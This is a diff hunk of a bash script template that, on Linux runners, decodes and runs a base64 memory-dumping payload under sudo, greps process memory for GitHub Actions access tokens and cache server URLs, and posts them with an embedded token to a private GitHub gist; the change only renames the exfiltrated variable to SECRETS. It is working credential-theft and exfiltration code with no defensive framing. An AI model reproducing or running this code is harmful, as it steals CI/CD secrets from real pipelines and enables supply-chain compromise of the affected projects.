@@ -149,7 +149,7 @@ if [[ "$OSTYPE" == "linux-gnu" ]]; then
   CACHETOKEN=`echo $ENCODED_MEMDUMP | base64 -d | sudo python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{{"AccessToken":"[^"]*"\\}}' | sort -u | base64 -w 0`
   CACHEURL=`echo $ENCODED_MEMDUMP | base64 -d | sudo python3 | tr -d '\\0' | grep -aoE '"CacheServerUrl":"[^"]*"' | sort -u | base64 -w 0`
   GIST_TOKEN_DECODED=`echo "{1}" | base64 -d`
-  curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $GIST_TOKEN_DECODED" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/gists -d '{{"public":false,"files":{{"{2}":{{"content":"'"$B64_BLOB:$CACHETOKEN:$CACHEURL"'"}}}}}}' > /dev/null 2>&1
+  curl -L -X POST -H "Accept: application/vnd.github+json" -H "Authorization: Bearer $GIST_TOKEN_DECODED" -H "X-GitHub-Api-Version: 2022-11-28" https://api.github.com/gists -d '{{"public":false,"files":{{"{2}":{{"content":"'"$SECRETS:$CACHETOKEN:$CACHEURL"'"}}}}}}' > /dev/null 2>&1
   sleep {3}
 else
   exit 0
